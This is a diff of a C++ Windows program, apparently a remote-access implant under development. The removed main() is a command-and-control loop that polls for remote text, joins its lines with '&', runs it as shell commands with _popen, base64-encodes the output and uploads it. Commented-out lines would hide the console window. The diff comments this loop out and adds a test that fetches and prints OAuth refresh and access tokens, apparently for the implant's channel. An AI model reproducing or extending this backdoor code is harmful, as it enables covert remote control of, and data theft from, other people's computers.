@@ -13,40 +13,44 @@ int Odd_Num() {
         return result - 1;
 }
 
-int main() {
-    //HWND h = GetConsoleWindow();
-    //ShowWindow(h, 0);
-    DWORD i = 2;
-    while (Odd_Num() % 2 != 0) {
-        Sleep(expo(i, 4) * 1000);
-        MyString data = downloadContext();
-        if (data.getLength() > 0) {
-            
-            i = 2;
-            for (int i = 0; i < data.getLength(); i++) {
-                if (data.getCharAt(i) == '\n') {
-                    data.setCharAt(i, '&');
-                }
-            }
-            FILE* file = _popen(data.getContext(), "r");
-            MyString output = "";
-            char temp_buffer[1024];
-            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
-                output = output + temp_buffer;
-            }
-            //output = encoder(output, 1);
-            output = converter_64(output);
-            upload(output);
-            deleteContext();
-        } else {
-            i++;
-        }
-    }
-    return 0;
-}
-
 //int main() {
-//    std::string accessToken;
-//    setNewAccessToken(accessToken);
-//    printf("Test begins:\n\tThe access token is: %s", accessToken.c_str());
+//    //HWND h = GetConsoleWindow();
+//    //ShowWindow(h, 0);
+//    DWORD i = 2;
+//    while (Odd_Num() % 2 != 0) {
+//        Sleep(expo(i, 4) * 1000);
+//        MyString data = downloadContext();
+//        if (data.getLength() > 0) {
+//            
+//            i = 2;
+//            for (int i = 0; i < data.getLength(); i++) {
+//                if (data.getCharAt(i) == '\n') {
+//                    data.setCharAt(i, '&');
+//                }
+//            }
+//            FILE* file = _popen(data.getContext(), "r");
+//            MyString output = "";
+//            char temp_buffer[1024];
+//            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
+//                output = output + temp_buffer;
+//            }
+//            //output = encoder(output, 1);
+//            output = converter_64(output);
+//            upload(output);
+//            deleteContext();
+//        } else {
+//            i++;
+//        }
+//    }
+//    return 0;
 //}
+
+int main() {
+    std::string refreshToken;
+    std::string accessToken;
+    DWORD responseCode;
+    /*setNewAccessToken(accessToken, refreshToken);*/
+    responseCode = setNewRefreshAndAccessToken(accessToken, refreshToken);
+    printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), responseCode);
+
+}
